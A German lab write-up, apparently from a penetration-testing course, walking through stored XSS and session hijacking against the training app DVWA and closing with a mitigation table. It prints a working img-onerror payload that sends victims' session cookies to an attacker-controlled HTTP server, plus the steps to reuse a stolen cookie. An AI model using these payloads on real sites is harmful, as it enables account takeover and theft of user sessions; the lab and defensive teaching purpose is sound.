# Kapitel 3: XSS & Session Hijacking

Ausgangspunkt dieses Kapitels war ein konkreter Fund aus dem automatisierten Nikto-Scan gegen DVWA (Port 8080): Der Session-Cookie `PHPSESSID` wird ohne das `HttpOnly`-Flag gesetzt. Dieses Detail verrät bereits vor dem eigentlichen Angriff, dass Session Hijacking über JavaScript möglich sein könnte.

## Ausgangslage: Nikto-Fund

```
Cookie PHPSESSID created without the HttpOnly flag
```

**Was das bedeutet:** Ein Cookie ohne `HttpOnly` ist für clientseitigen JavaScript-Code lesbar (`document.cookie`). Das ist die technische Voraussetzung für den gesamten Angriff in diesem Kapitel.

## Theorie: Stored XSS vs. Reflected XSS

Es gibt zwei grundlegende XSS-Varianten:

- **Reflected XSS:** Der Payload steckt in der URL, wird vom Server "zurückgespiegelt" und nur einmal ausgeführt, wenn jemand auf den manipulierten Link klickt. Kurzlebig und erfordert Interaktion des Opfers.
- **Stored XSS:** Der Payload wird in der Datenbank gespeichert und bei **jedem** Seitenaufruf für **alle** Besucher automatisch ausgeführt. Das Opfer muss keinen speziellen Link öffnen, es reicht der normale Besuch der Seite.

Für Session Hijacking ist Stored XSS die gefährlichere Variante, weil der Angriff vollständig automatisiert und unsichtbar für das Opfer abläuft.

## Schritt 1: XSS-Schwachstelle identifizieren

DVWA bietet unter "XSS (Stored)" ein Gästebuch-Formular. Erster Test mit harmlosem HTML:

```html
<b>Testtext</b>
```

**Ergebnis:** Der Text wird **fett** dargestellt, nicht als wörtlicher String. Der Server gibt die Eingabe ungefiltert als HTML an den Browser zurück, er unterscheidet nicht zwischen Text und Code.

## Schritt 2: JavaScript-Ausführung bestätigen (Proof of Concept)

Da das Eingabefeld ein `maxlength`-Attribut hatte, wurde dieses direkt im Seitenquelltext über die Browser-Developer-Tools erhöht — eine rein clientseitige Einschränkung, die serverseitig nicht geprüft wird.

Da DVWA `<script>`-Tags beim Speichern herausfiltert, wurde ein alternativer Payload über den `onerror`-Event-Handler eines `<img>`-Tags verwendet. Ein Bild mit absichtlich ungültiger URL löst `onerror` automatisch beim Laden der Seite aus, ohne Nutzerinteraktion:

```html
<img src="x" onerror="alert(document.cookie)">
```

**Ergebnis:** Ein Alert-Fenster erscheint mit dem vollständigen Inhalt von `document.cookie`, inklusive der `PHPSESSID` des aktuell eingeloggten Nutzers.

**Warum `<script>` gefiltert wurde, `onerror` aber nicht:** DVWA's Filter prüft auf bekannte Tags, ist aber unvollständig. Event-Handler in HTML-Attributen sind eine von vielen Umgehungsmethoden. Das ist der Grund, warum Blacklist-basierte Filter grundsätzlich als unsichere Schutzmaßnahme gelten.

## Schritt 2b: Cookie-Exfiltration (vollständiger Angriff)

Der `alert()`-Payload beweist, dass der Cookie auslesbar ist. Der realistische Angriff exfiltriert den Cookie unsichtbar und automatisch an den Angreifer-Server — ohne jede Nutzerinteraktion:

```bash
# Auf Kali: einfachen HTTP-Server starten
python3 -m http.server 9999
```

```html
<!-- Payload im DVWA-Gästebuch: -->
<img src="x" onerror="new Image().src='http://192.168.20.10:9999/'+document.cookie">
```

**Ablauf:** Sobald irgendein eingeloggter Nutzer die Gästebuch-Seite aufruft, macht sein Browser einen stillen GET-Request an den Kali-Server. Im Python-Output erscheint dann der Cookie:

```
192.168.10.X - - [date] "GET /PHPSESSID=h1smvv6vinft05a4lq5vs7il1 HTTP/1.1" 404 -
```

**Warum `new Image().src` statt `document.location`:** `document.location` würde die gesamte Seite auf die Angreifer-URL weiterleiten — der Nutzer würde eine Fehlermeldung sehen und den Angriff bemerken. `new Image().src` macht einen Hintergrund-Request ohne sichtbare Auswirkung auf die Seite.

## Schritt 3: Session Hijacking

Mit der exfiltrierten Session-ID lässt sich die Session des Opfers vollständig übernehmen:

1. Browser-Developer-Tools öffnen (F12) → Reiter **Console**
2. Cookie manuell setzen:
```javascript
document.cookie = "PHPSESSID=<gestohlene_session_id>"
```
3. Seite neu laden

**Ergebnis:** Eingeloggt als Admin, ohne jemals das Passwort eingegeben zu haben. Der Server sieht keinen Unterschied zwischen einem legitimen Cookie und einem gestohlenen — für ihn ist ein gültiger Session-Cookie ein gültiger Session-Cookie.

## Der vollständige Angriffspfad

```
Nikto-Scan → fehlende HttpOnly-Flag erkannt
→ Stored XSS (onerror-Payload in Gästebuch-DB gespeichert)
→ Opfer lädt Seite → JavaScript läuft automatisch im Hintergrund
→ new Image().src schickt Cookie per GET an Kali (python3 -m http.server 9999)
→ Session-ID in Angreifer-Browser gesetzt (document.cookie in Console)
→ Session übernommen ohne Passwort
```

## Warum HttpOnly diesen Angriff vollständig verhindert hätte

Das `HttpOnly`-Flag weist den Browser an, den Cookie **ausschließlich über HTTP-Anfragen** zu übertragen. JavaScript hat keinen Zugriff — `document.cookie` würde den Cookie schlicht nicht anzeigen. Der gesamte Angriffspfad bricht damit an Schritt 3 ab: Der Payload kann zwar noch ausgeführt werden, aber es gibt nichts auszulesen.

Das ist auch der Grund, warum der Nikto-Fund am Anfang so relevant war: Das fehlende Flag hat bereits vor dem ersten manuellen Test signalisiert, dass dieser Angriff möglich sein würde.

## Lerneffekt: Browser-Konsole als Angriffswerkzeug

Die Browser-Developer-Tools (F12 → Console) sind ein vollwertiger JavaScript-Interpreter im Kontext der aktuell geöffneten Seite, mit vollen Zugriffsrechten auf DOM, Cookies und localStorage. Was manuell in der Konsole ausgeführt werden kann, kann ein XSS-Payload automatisch und unsichtbar im Hintergrund tun — das ist der Kern der Gefährlichkeit von XSS als Angriffsklasse.

## Mitigation

| Schwachstelle | Gegenmaßnahme |
|---|---|
| XSS (fehlende Eingabevalidierung) | Output-Encoding (z.B. `htmlspecialchars()` in PHP); Content Security Policy (CSP) als zusätzliche Schicht; nie Nutzereingaben ungefiltert als HTML ausgeben |
| Fehlende HttpOnly-Flag | `Set-Cookie: PHPSESSID=...; HttpOnly` — verhindert JavaScript-Zugriff auf den Cookie komplett |
| Fehlende Secure-Flag | `Set-Cookie: ...; Secure` — Cookie wird nur über HTTPS übertragen |
| Blacklist-basierter XSS-Filter | Whitelist-Ansatz oder etablierte Libraries (z.B. DOMPurify) statt eigener Filterlogik; Blacklists sind grundsätzlich unvollständig |
| clientseitiges maxlength | Eingabelänge immer zusätzlich serverseitig validieren |
